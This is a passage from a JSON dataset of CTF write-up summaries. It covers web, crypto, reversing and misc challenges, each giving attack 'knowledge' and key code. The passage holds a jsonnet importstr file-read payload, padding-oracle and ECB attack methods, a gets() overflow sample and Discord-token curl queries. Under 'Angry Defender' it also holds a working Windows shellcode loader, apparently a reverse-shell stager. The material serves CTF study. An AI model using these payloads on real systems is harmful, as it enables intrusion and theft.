        "write_up": "dataset/raw/Advanced Json Cutifier.md",
        "type": "web",
        "competition": [
            "Mapna/2024",
            "https://ctftime.org/event/2205/tasks/"
        ],
        "score": 59,
        "max_score": 375,
        "difficulty": 0.15733333333333333,
        "knowledge": [
            "When encountering an error message in a challenge that involves parsing or compiling, such errors can reveal the underlying technology or libraries used. This can be used as a clue to identify the library and explore its known issues or vulnerabilities which might be exploited in the challenge. Always consider searching for error messages verbatim online as they may directly lead to the identification of the tool or library in use.",
            "For challenges involving file reading where direct file access is restricted or seems impossible, exploring the issue tracker or documentation of the involved library or tool can reveal unintended features or exploits. Specifically, in scenarios involving data formatting or transformation libraries, look for features that allow importing or including external files, which can be exploited to read restricted files if the application fails to adequately secure against such behavior. \nExample payload for reading a file when a library supports file import or inclusion:\n```json\n{\n   \"key\": importstr \"/flag.txt\"\n}\n```"
        ],
        "key": "```go\npackage main\n\nimport (\n\t\"net/http\"\n\t\"github.com/gin-gonic/gin\"\n\t\"github.com/google/go-jsonnet\"\n)\n\nfunc main() {\n\tr := gin.Default()\n\n\tr.POST(\"/beautify\", func(c *gin.Context) {\n\t\tvar jsonInput map[string]interface{}\n\t\tif err := c.ShouldBindJSON(&jsonInput); err != nil {\n\t\t\tc.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()})\n\t\t\treturn\n\t\t}\n\n\t\tvm := jsonnet.MakeVM()\n\t\tjsonStr, err := vm.EvaluateSnippet(\"snippet\", jsonInput[\"code\"].(string))\n\t\tif err != nil {\n\t\t\tc.JSON(http.StatusInternalServerError, gin.H{\"error\": err.Error()})\n\t\t\treturn\n\t\t}\n\n\t\tc.JSON(http.StatusOK, gin.H{\"result\": jsonStr})\n\t})\n\n\tr.Run(\":8080\")\n}\n```\n"
    },
    {
        "name": "Advanced Reversing Mechanics 2",
        "write_up": "dataset/raw/Advanced Reversing Mechanics 2.md",
        "type": "The type of challenge in this write-up is **reverse**.",
        "competition": [
            "rgbCTF/2020",
            "https://ctftime.org/event/1042/tasks/"
        ],
        "score": 461,
        "max_score": 500,
        "difficulty": 0.922,
        "knowledge": [
            "When faced with an encrypted flag and a corresponding encryption function from a reversing challenge, a viable approach is to reverse-engineer the encryption logic. If direct reversal is complex or impractical, an alternative method involves using brute force to determine the original inputs that produce the given encrypted outputs. This technique applies broadly, regardless of the encryption algorithm's specifics, as long as the character set for potential inputs is manageable and known.",
            "For binary analysis and reversing tasks involving compiled code, tools like Ghidra can be used for decompilation to understand the algorithm's logic. This understanding can then be applied in coding a script that systematically tries each character in a known character set against the encryption function. This approach is suitable when encryption functions are too complex to invert logically or mathematically. This method's efficiency is significantly increased when the possible character set is limited and well-defined, as is often the case in CTF challenges involving textual flags.\n\nSample payload (conceptual illustration rather than specific code):\n\n```c\nfor each character in flag:\n  for each possible character in known character set:\n    if encrypt(possible character) == encrypted character:\n      append possible character to decrypted flag\nprint decrypted flag\n```"
        ],
        "key": "```c\nvoid encryptFlag(byte *param_1)  \n{  \n byte *pbVar1;  \n byte *pbVar2;  \n uint uVar3;  \n byte bVar4;  \n uint uVar5;  \n uint uVar6;  \n  \n bVar4 = *param_1;  \n pbVar1 = param_1;  \n if (bVar4 == 0) {  \n   return;  \n }  \n while( true ) {  \n   uVar5 = (uint)bVar4;  \n   uVar3 = uVar5 - 10 & 0xff;  \n   uVar6 = uVar5;  \n   if ((bVar4 < 0x50) && (uVar6 = uVar3, 0x50 < uVar3)) {  \n     uVar6 = uVar5 + 0x46 & 0xff;  \n   }  \n   uVar6 = (uVar6 - 7 ^ 0x43) & 0xff;  \n   pbVar2 = pbVar1 + 1;  \n   *pbVar1 = (byte)(uVar6 << 6) | (byte)(uVar6 >> 2);  \n   bVar4 = *pbVar2;  \n   if (bVar4 == 0) break;  \n   uVar6 = (int)(pbVar2 + -(int)param_1) % 5;  \n   bVar4 = bVar4 << (-uVar6 & 7) | bVar4 >> (uVar6 & 0xff);  \n   if (uVar6 == 2) {  \n     bVar4 = bVar4 - 1;  \n   }  \n   *pbVar2 = bVar4;  \n   bVar4 = *pbVar2;  \n   pbVar1 = pbVar2;  \n }  \n return;  \n}\n```"
    },
    {
        "name": "AEG",
        "write_up": "dataset/raw/AEG.md",
        "type": "reverse",
        "competition": [
            "UTCTF/2021",
            "https://ctftime.org/event/1177/tasks/"
        ],
        "score": 992,
        "max_score": 1000,
        "difficulty": 0.992,
        "knowledge": [
            "When facing a dynamically generated binary with a buffer overflow vulnerability and complex input encoding functions, **angr** can be utilized to automatically generate an exploit by symbolically executing the binary until an unconstrained state is reached. This signifies control over the instruction pointer, allowing determination of input that directs execution to a desired function, such as a win function in CTF challenges.",
            "To interact with a binary that processes encoded input, creating a symbolic payload with constraints that lead to the execution of a specific function (e.g., a win function) can be an effective strategy. This involves using a symbolic execution engine like **angr** to reverse the encoding process and solve for the original input that, when processed by the binary's encoding functions, results in the intended exploitation. This method is particularly useful in automated exploit generation (AEG) scenarios where direct analysis of the encoding functions is impractical.\n\nSample script snippet to create payload:\n```python\nwin = proj.loader.find_symbol(\"win\")\nexp.add_constraints(exp.regs.pc == win.linked_addr)\npayload_real = exp.solver.eval(payload_ast, cast_to=bytes)\n```\nThis code finds the address of the win function, constrains the instruction pointer to this address, and solves for the payload that achieves this state."
        ],
        "key": "```c\nvoid vuln(char *input) {  \n char buf[44];  \n encode1(input);  \n encode2(input);  \n encode3(input);  \n encode4(input);  \n encode5(input);  \n encode6(input);  \n encode7(input);  \n memcpy(buf, input, strlen(input));  \n return;  \n}\n\nint main() {  \n char buf [64];  \n fgets(buf, 64, stdin);  \n vuln(buf);  \n return 0;  \n}\n\nvoid win() {  \n exit(100);  \n}\n```"
    },
    {
        "name": "AESential Lesson",
        "write_up": "dataset/raw/AESential Lesson.md",
        "type": "crypto",
        "competition": [
            "TU/2018",
            "https://ctftime.org/event/650/tasks/"
        ],
        "score": 465,
        "max_score": 497,
        "difficulty": 0.9356136820925554,
        "knowledge": [
            "In a challenge involving AES encryption in ECB mode, an attacker can exploit the fact that identical plaintext blocks produce identical ciphertext blocks. This property allows for a chosen plaintext attack, where an attacker can systematically guess each byte of the plaintext by observing the encrypted output. If the scenario involves encrypting user input concatenated with a secret (like a flag) using a known block size (e.g., 32 bytes for AES), the attacker can append their input to form complete blocks and compare the resulting encrypted blocks to decipher the secret byte by byte. \n    - Example payload to determine a single character of the secret: `UserInput + knownPartOfTheSecret + PaddingCharacter * (BlockSize - len(UserInput) - len(knownPartOfTheSecret) - 1) + GuessCharacter`\n    - Here, `BlockSize` is the known block size (e.g., 32 bytes for AES), `PaddingCharacter` is the character used to pad the plaintext to a multiple of the block size, `knownPartOfTheSecret` is the already deciphered part of the secret, and `GuessCharacter` is the character being tested.",
            "When the encryption service adds padding to the user's input to match the encryption block size, the value of the padding character can be determined by analyzing the encrypted output of specifically crafted inputs. The attacker sends inputs designed to reveal the padding character through the observation of repeating encrypted blocks. Once the padding character is known, it can be used as part of a chosen plaintext attack to uncover secrets, such as flags, encrypted along with the input. \n    - Example for finding the padding character: If the attacker sends a payload with a known character followed by enough instances of a guess for the padding character to complete an encryption block (`\"}\" + GuessPaddingCharacter * (BlockSize - 1) + \"a\"`), and observes that the ciphertext has repeating blocks, it indicates that the guessed padding character matches the actual padding character used by the encryption service."
        ],
        "key": "```python\n#!/usr/bin/env python2\n\nfrom Crypto.Cipher import AES\n\nfrom select import select\n\nimport sys\n\nINTRO = \"\"\"  \nLol. You think you can steal my flag?  \nI\\'ll even encrypt your input for you,  \nbut you can\\'t get my secrets!\n\n\"\"\"\n\nflag = \"REDACTED\" # TODO Redact this\n\nkey = \"REDACTED\" # TODO Redact this\n\nif __name__ == '__main__':\n\n    padc = 'REDACTED' #TODO Redact this\n\n    assert (len(flag) == 32) and (len(key) == 32)\n\n    cipher = AES.new(key, AES.MODE_ECB)\n\n    sys.stdout.write(INTRO)  \n    sys.stdout.flush()\n\n    while True:  \n        try:  \n            sys.stdout.write('Enter your text here: ')  \n            sys.stdout.flush()\n\n            rlist, _, _ = select([sys.stdin], [], [])\n\n            inp = ''  \n            if rlist:  \n                inp = sys.stdin.readline().rstrip('\\n')\n\n            plaintext = inp + flag  \n            l = len(plaintext)\n\n            padl = (l // 32 + 1)*32 if l % 32 != 0 else 0\n\n            plaintext = plaintext.ljust(padl, padc)\n\n            sys.stdout.write('Here\\'s your encrypted text:\\n{}\\n\\n'.format((cipher.encrypt(plaintext)).encode('hex')))  \n        except KeyboardInterrupt:  \n            exit(0)  \n```"
    },
    {
        "name": "AESy",
        "write_up": "dataset/raw/AESy.md",
        "type": "crypto",
        "competition": [
            "ByteBandits/2020",
            "https://ctftime.org/event/1022/tasks/"
        ],
        "score": 471,
        "max_score": 500,
        "difficulty": 0.942,
        "knowledge": [
            "To exploit CBC (Cipher Block Chaining) mode encryption vulnerabilities, particularly padding oracle attacks, identify the presence of such vulnerabilities by observing the system's response to manipulated ciphertext. A valid manipulation that aligns with the expected padding after decryption (resulting in a distinct server response) confirms the potential to perform a padding oracle attack. This method requires knowing or guessing the encryption scheme (CBC in this case) and observing the system's differential responses to valid versus manipulated or invalid messages.\n\n   - Example manipulation for confirming CBC padding oracle vulnerability: Encrypt a known plaintext (e.g., 'aaaaaaa'), which after hex-encoding becomes 14 bytes, expecting padding to complete the block. Manipulate (flip) the last byte of what is presumed to be the Initialization Vector (IV) to alter the expected padding byte in the decrypted plaintext. A server response indicating success (`!`) versus failure (`?`) can confirm the existence of a CBC padding oracle.",
            "Implement an oracle function in programming (e.g., Python) that interacts with the vulnerable system by sending manipulated ciphertexts and observing the responses. This oracle function is essential for automated exploitation of padding oracle attacks, enabling the decryption of ciphertexts without direct access to the encryption key. Through iterative manipulation and observation, this process gradually reveals the plaintext corresponding to a given ciphertext.\n\n   - In the context of the challenge, the oracle function sends manipulated ciphertext to a server and interprets the received response to determine if the padding was valid. Successful implementation of such an oracle enables automated recovery of plaintext data, including encrypted flags or sensitive information, from the ciphertexts provided by the system."
        ],
        "key": "```python\ndef encrypt_message(message):\n    # Assume this function encrypts the message using AES in CBC mode\n    # and returns the ciphertext along with the IV\n    iv = os.urandom(16)\n    cipher = AES.new(key, AES.MODE_CBC, iv)\n    padded_message = pad(message.encode(), 16)\n    ciphertext = cipher.encrypt(padded_message)\n    return iv + ciphertext\n\ndef send_to_alice(ciphertext):\n    # Assume this function sends the ciphertext to Alice\n    # and returns '!' if the padding is correct, '?' otherwise\n    try:\n        decrypted_message = decrypt_message(ciphertext)\n        if is_valid_padding(decrypted_message):\n            return '!'\n        else:\n            return '?'\n    except:\n        return '?'\n\ndef decrypt_message(ciphertext):\n    # Assume this function decrypts the ciphertext using AES in CBC mode\n    iv = ciphertext[:16]\n    cipher = AES.new(key, AES.MODE_CBC, iv)\n    decrypted_message = cipher.decrypt(ciphertext[16:])\n    return decrypted_message\n\ndef is_valid_padding(message):\n    # Assume this function checks if the padding of the message is valid\n    padding_length = message[-1]\n    if padding_length > 16:\n        return False\n    return all(p == padding_length for p in message[-padding_length:])\n```"
    },
    {
        "name": "Algorithm",
        "write_up": "dataset/raw/Algorithm.md",
        "type": "reverse",
        "competition": [
            "HSCTF/2019",
            "https://ctftime.org/event/821/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with a reverse engineering challenge involving a binary that utilizes standard library data structures heavily (e.g., `std::vector`, `std::map`, `std::set`, etc.), one efficient strategy is to identify patterns of C++ code in decompilation output to quickly understand complex data interactions. This approach focuses on recognizing generic patterns like scope resolution (`::` for accessing standard library functionalities), operator overloading (`operator<<`, `operator>>` for I/O operations), and iterators (`begin()`, `end()`, and `operator++` for traversing containers) to decipher algorithm logic without getting bogged down in template or syntactic complexities. This method is applicable in scenarios where the binary's use of C++ STL containers significantly influences the program's behavior or its data processing logic.",
            "In CTF challenges where the task involves inputting data to form a graph that is subsequently processed by an algorithm within a binary, understanding the algorithm's goal and the structure it expects can be crucial. If the binary implements a graph algorithm, such as Breadth-First Search (BFS), providing input that meets the algorithm's expected conditions can lead to a successful exploit. For instance, if the algorithm requires a specific graph structure (like a linear graph where the nodes are visited in a particular order) to return a successful result, constructing input that mirrors this structure will satisfy the algorithm's conditions, possibly revealing hidden data or flags. In challenges where the constraints include node connectivity and specific traversal orders, constructing an adjacency list representation that meets these requirements is key. \n   \n   Example input for a linear graph structure to satisfy a BFS algorithm expecting nodes in increasing order:\n   ```\n   5\n   4 5\n   5 6\n   6 7\n   7 8\n   8 9\n   ```"
        ],
        "key": "```cpp\n#include <iostream>\n#include <map>\n#include <vector>\n#include <queue>\n#include <set>\n\nint compute(std::map<int, std::vector<int>> &pair_map) {\n    std::set<int> visited;\n    std::queue<std::pair<int, int>> q;\n    q.emplace(4, 0);\n\n    while (!q.empty()) {\n        auto [curr_key, curr_val] = q.front();\n        q.pop();\n\n        if (visited.find(curr_key) != visited.end()) {\n            continue;\n        }\n        visited.insert(curr_key);\n\n        if (curr_key != curr_val + 4) {\n            return 0;\n        }\n\n        for (int curr_mapval_vec_val : pair_map[curr_key]) {\n            q.emplace(curr_mapval_vec_val, curr_val + 1);\n        }\n    }\n\n    return visited.size() == pair_map.size() ? 1 : 0;\n}\n\nint main() {\n    int num_pairs;\n    std::cout << \"Input a number: \";\n    std::cin >> num_pairs;\n\n    std::map<int, std::vector<int>> pair_map;\n    std::cout << \"Input \" << num_pairs << \" pairs of numbers:\\n\";\n    for (int i = 0; i < num_pairs; ++i) {\n        int num_key, num_val;\n        std::cin >> num_key >> num_val;\n\n        if (pair_map.find(num_key) == pair_map.end()) {\n            pair_map[num_key] = std::vector<int>();\n        }\n        if (pair_map.find(num_val) == pair_map.end()) {\n            pair_map[num_val] = std::vector<int>();\n        }\n        pair_map[num_key].push_back(num_val);\n        pair_map[num_val].push_back(num_key);\n    }\n\n    if (compute(pair_map)) {\n        std::cout << \"Correct!\" << std::endl;\n    } else {\n        std::cout << \"Wrong!\" << std::endl;\n    }\n\n    return 0;\n}\n```"
    },
    {
        "name": "Alice & Bob Flip a Bit Easy",
        "write_up": "dataset/raw/Alice & Bob Flip a Bit Easy.md",
        "type": "This write-up describes a reverse challenge.",
        "competition": [
            "FE-CTF/2023",
            "https://ctftime.org/event/1979/tasks/"
        ],
        "score": 0.33,
        "max_score": 1,
        "difficulty": 0.33,
        "knowledge": [
            "When encoding data with a constraint on the maximum allowed number of bits (encoding space) and the need to ensure data integrity against single-bit errors, a method is to use error-correction techniques that utilize redundancy and special hash functions. Especially, when the encoding space closely matches the size of the data, techniques such as triplicating each bit and using majority voting for decoding or designing a custom hash function that maps data bits to a smaller space (while ensuring that any single bit flip can be detected and corrected) are effective. \n\n   - For triplication and majority voting:\n     ```python\n     def alice(args):\n         return [bool(int(c)) for b in args for c in format(b, '08b')]*3\n\n     def bob(args):\n         return bytes(int(''.join(str(int(sum(args[i:i+3])/2)) for i in range(0, len(args), 3)), 2) for _ in range(0, len(args), 24))\n     ```\n   \n   - For custom hash function with bit mapping and correction:\n     ```python\n     def alice(args):\n         # Imagine args is a byte array needing encoding\n         # Encode args to a list with exactly 513 bits, utilizing a custom hash function\n         pass  # The implementation would depend on the chosen hash function and mapping\n\n     def bob(args):\n         # Decode the bit list back to the original byte array, correcting the single bit error\n         pass  # Specific decoding logic utilizing the inverse of the hash function and mapping\n     ```",
            "When leveraging Hamming codes for error detection and correction, the use of additional information such as a boolean flag indicating if correction was needed can optimize the encoding/decoding process. This allows for the transmission of slightly more data than the Hamming code would normally allow by enabling the detection of errors outside the normally protected area. This can be applied when you have a very tight constraint on encoding space and need to maximize data throughput within those bounds.\n\n   - Sketch of leveraging Hamming code with an extra boolean for data transmission:\n     ```python\n     def alice(msg):\n         # Encode msg up to 502 bits using Hamming, plus two extra bits outside Hamming's protection.\n         pass  # Implement the encoding including the extra bits and Hamming encoding for the rest.\n\n     def bob(msg):\n         # Decode the message, checking the extra boolean to correct a bit flip outside the Hamming protected area.\n         pass  # Use Hamming decoding, then correct the message based on the status of the extra boolean.\n     ```"
        ],
        "key": "```python  \ndef run_single_check():  \n   token = list(os.urandom(N))  \n   msg = alice(token)  \n   assert type(msg) == list and len(msg) <= 64 * 8 and all(x is True or x is False for x in msg)  \n   if msg: msg[random.randrange(0, len(msg))] ^= True  \n   assert bob(msg) == token\n\nfor _ in range(1000):  \n   run_single_check()\n\nsend_flag()  \n```"
    },
    {
        "name": "Alphabet",
        "write_up": "dataset/raw/Alphabet.md",
        "type": "The type of this CTF challenge is `misc`.",
        "competition": [
            "FireShell/2020",
            "https://ctftime.org/event/944/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When faced with a challenge involving hashed strings, especially when the hashes represent characters or sets of characters, one effective approach is to pre-generate the hashes of all possible characters (including alphanumeric characters and special symbols). This allows for a quick lookup to reverse the hashes back to their original characters. This technique is useful not only for MD5 and SHA256 hashes but can be adapted for other hashing algorithms as well. \n    - Example payload generation snippet (for MD5 and SHA256):\n        ```perl\n        use Digest::SHA qw(sha256_hex);  \n        use Digest::MD5 qw(md5_hex);\n        my @chars = (\"a\"..\"z\", \"A\"..\"Z\", 0..9, qw(_ , . - { } [ ] ! @ # $ % ^ & * : ; '));\n        my %md5;  \n        my %sha256;\n        for(my $i=0; $i<=$#chars; $i++){  \n         $md5{md5_hex($chars[$i])} = $chars[$i];  \n         $sha256{sha256_hex($chars[$i])} = $chars[$i];  \n        }\n        ```",
            "For CTF challenges where the flag is hidden within a large block of text, after extracting meaningful data (e.g., converting hashes back to text), regular expressions can be utilized to search for the flag pattern. This is particularly useful when the flag follows a known format, which is common in many CTF competitions.\n    - Example regular expression usage to find a flag in the format `F#{...}`:\n        ```perl\n        perl -nE 'say $1 if /(F#{\\w+})/'\n        ```"
        ],
        "key": "```perl\nuse strict;  \nuse warnings;  \nuse feature 'say';  \nuse Digest::SHA qw(sha256_hex);  \nuse Digest::MD5 qw(md5_hex);\n\nmy $file = 'submit_the_flag_that_is_here.txt';  \nopen(my $fh, '<:encoding(UTF-8)', $file)  \n or die \"Could not open file '$file' $!\";\n\nmy $str;  \n$str = <$fh>;  \nchomp $str;\n\nmy @chars=(\"a\"..\"z\",\"A\"..\"Z\",0..9,qw(_ , . - { } [ ] ! @ # $ % ^ & * : ; '\n\"),\"not found\");\n\nmy %md5;  \nmy %sha256;\n\nfor(my $i=0; $i<=$#chars; $i++){  \n $md5{md5_hex($chars[$i])} = $i;  \n $sha256{sha256_hex($chars[$i])} = $i;  \n}\n\nfor my $hash (split / /, $str) {  \n my $ind = -1;  \n $ind = $md5{$hash} if exists $md5{$hash};  \n $ind = $sha256{$hash} if exists $sha256{$hash};  \n my $res = $chars[$ind];  \n print $res;  \n}  \n```"
    },
    {
        "name": "angrme",
        "write_up": "dataset/raw/angrme.md",
        "type": "reverse",
        "competition": [
            "HXP/2018",
            "https://ctftime.org/event/647/tasks/"
        ],
        "score": 50,
        "max_score": 412,
        "difficulty": 0.12135922330097088,
        "knowledge": [
            "When working with binary challenges, especially those hinting towards the usage of symbolic execution or when directly suggested, the angr framework presents a powerful tool for automating the exploration of binary paths to discover specific outcomes (e.g., finding a happy path marked by a specific output like \":)\"). An initial setup involves importing angr, setting up a project with the target binary, and leveraging the `simgr.explore()` function to search for the desired state. This approach is particularly beneficial in binaries with bifurcating paths leading to different outputs indicating success or failure states. \n   Example setup:\n   ```python\n   import angr\n   proj = angr.Project('binary_name')\n   simgr = proj.factory.simgr()\n   simgr.explore(find=lambda s: b\"desired_output\" in s.posix.dumps(1))\n   ```",
            "In scenarios where the immediate goal is to extract outputs or inputs relevant to succeeding in the challenge (e.g., extracting the flag), one can use the `simgr.found[0].posix.dumps(0)` or `simgr.found[0].posix.dumps(1)` after successfully finding the desired state with `simgr.explore()`. This method directly accesses the standard input or output related to the found state, allowing for the extraction of data that led to or resulted from the successful execution path. This process is invaluable when the challenge involves understanding the specific inputs or conditions leading to a successful binary execution outcome, such as reaching a winning message or code execution path.\n   Example command to get output:\n   ```python\n   s = simgr.found[0]\n   print(s.posix.dumps(1)) # For stdout data\n   ```"
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nint main() {\n    char input[64];\n    printf(\"Enter the password: \");\n    gets(input); // Vulnerable function: gets() allows buffer overflow\n    if (strcmp(input, \"correct_password\") == 0) {\n        printf(\":)\\n\");\n    } else {\n        printf(\":(\\n\");\n    }\n    return 0;\n}\n```"
    },
    {
        "name": "Angry Defender",
        "write_up": "dataset/raw/Angry Defender.md",
        "type": "reverse",
        "competition": [
            "CONFidence/2020/Quals",
            "https://ctftime.org/event/960/tasks/"
        ],
        "score": 448,
        "max_score": 476,
        "difficulty": 0.9411764705882353,
        "knowledge": [
            "When dealing with antivirus evasion in a CTF challenge where the task involves interacting with an application monitored by an antivirus, common shellcodes used for exploitation (for example, those generated by tools like Msfvenom) can be utilized to trigger an antivirus detection. This can be specifically helpful when the application appends a flag to an executable file, and the execution of a shellcode can result in the antivirus deleting the file, thus serving as an implicit signal (e.g., deletion oracle) for detecting specific conditions (like the presence of a flag). This technique leverages the fact that antivirus systems often incorporate x86 emulators to scan new executables for known malicious patterns. Example shellcode snippet that could trigger an antivirus: \n\\[\n\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\"\n\\]",
            "Optimization of executable payloads can significantly increase the efficiency of exploits, especially in environments with constrained resources or where rapid execution is necessary. In the context of crafting a custom payload for a CTF challenge, removing dependencies on the C runtime library (CRT) through linker options like `/NODEFAULTLIB` and setting the entry point directly to the `main` function can result in smaller and faster-executing binaries. This approach requires the manual management of code execution flow and memory protection mechanisms but allows for tighter control over the payload's behavior and interaction with the system. This knowledge is particularly applicable when creating custom payloads intended to operate under tight performance constraints or in heavily monitored environments."
        ],
        "key": "```cpp\n#define WIN32_LEAN_AND_MEAN  \n#include <Windows.h>\n\n// shellcode is encrypted by solve.py  \n#pragma section(\".text\")  \n__declspec(allocate(\".text\"))  \nunsigned char shellcode[] = \"\"  \n\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\"  \n\"\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\"  \n\"\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\"  \n\"\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\"  \n\"\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\"  \n\"\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\\x85\\x72\\x00\\x00\\x00\\x8b\"  \n\"\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\"  \n\"\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\"  \n\"\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\"  \n\"\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\"  \n\"\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\"  \n\"\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"  \n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\"  \n\"\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\"  \n\"\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\\x00\"  \n\"\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\\x89\\xe5\"  \n\"\\x49\\xbc\\x02\\x00\\x7a\\x69\\x89\\x2d\\xe4\\x89\\x41\\x54\\x49\\x89\\xe4\"  \n\"\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\x68\"  \n\"\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a\"  \n\"\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89\"  \n\"\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\"  \n\"\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba\"  \n\"\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\x49\\xff\\xce\\x75\\xe5\"  \n\"\\xe8\\x93\\x00\\x00\\x00\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9\"  \n\"\\x6a\\x04\\x41\\x58\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5\"  \n\"\\x83\\xf8\\x00\\x7e\\x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41\"  \n\"\\x59\\x68\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41\"  \n\"\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31\"  \n\"\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\"  \n\"\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x41\\x57\\x59\\x68\\x00\\x40\"  \n\"\\x00\\x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\xba\\x0b\\x2f\\x0f\\x30\\xff\\xd5\"  \n\"\\x57\\x59\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x49\\xff\\xce\\xe9\\x3c\"  \n\"\\xff\\xff\\xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\\x85\\xf6\\x75\\xb4\\x41\"  \n\"\\xff\\xe7\\x58\\x6a\\x00\\x59\\x49\\xc7\\xc2\\xf0\\xb5\\xa2\\x56\\xff\\xd5\";\n\nint main() {  \n   TCHAR path[MAX_PATH];  \n   GetModuleFileName(NULL, path, MAX_PATH);  \n   auto hFile = CreateFile(path, FILE_READ_DATA, FILE_SHARE_READ, NULL,\nOPEN_EXISTING, 0, NULL);  \n   SetFilePointer(hFile, -1, NULL, FILE_END);  // -1 here is patched by\nsolve.py  \n   unsigned char c;  \n   ReadFile(hFile, &c, 1, NULL, NULL);\n\n   // debug output  \n   auto stdout = GetStdHandle(STD_OUTPUT_HANDLE);  \n   unsigned char x;  \n   x = \"0123456789ABCDEF\"[c >> 4];  \n   WriteFile(stdout, &x, 1, NULL, NULL);  \n   x = \"0123456789ABCDEF\"[c & 15];  \n   WriteFile(stdout, &x, 1, NULL, NULL);\n\n   DWORD oldProtect;  \n   if (!VirtualProtect((LPVOID)((ptrdiff_t)&shellcode & 0xFFFFFFFFFFFFF000LL),\n0x1000, PAGE_EXECUTE_READWRITE, &oldProtect)) {  \n       WriteFile(stdout, \"VirtualProtect failed\", 22, NULL, NULL);  \n       return 0;  \n   }  \n   if (c <= 0x60) {                            // 0x60 here is patched by\nsolve.py  \n       for (size_t i = 0; i < sizeof(shellcode); ++i) {  \n           shellcode[i] ^= 0xAA;  \n       }  \n   }  \n   ((void(*)())&shellcode)();  \n   return 0;  \n}  \n```"
    },
    {
        "name": "Another Discord 100",
        "write_up": "dataset/raw/Another Discord 100.md",
        "type": "misc",
        "competition": [
            "TCP1P-CTF/2023",
            "https://ctftime.org/event/2001/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When participating in CTF challenges involving Discord, it is crucial to explore unconventional features or recent updates on the platform that might be used to hide information. For example, checking the details of ongoing events and the usage of text channels linked to voice channels could reveal parts of the flag.",
            "To extract information such as roles and channel names from a Discord server which might contain parts of the flag, leveraging Discord's API with appropriate authorization can be highly effective. Use curl commands with the Discord token for authorization to query the server's roles and channels. Ensure to replace `{guild.id}` with the actual server ID and insert the Discord token in place of `(discord token here)`.\n   \n   Example usage to fetch roles:\n   ```\n   curl -sH \"AUTHORIZATION: your_discord_token_here\" https://discordapp.com/api/v6/guilds/{guild.id}/roles\n   ```\n   \n   Example usage to fetch channels:\n   ```\n   curl -sH \"AUTHORIZATION: your_discord_token_here\" https://discordapp.com/api/v6/guilds/{guild.id}/channels\n   ```"
        ],
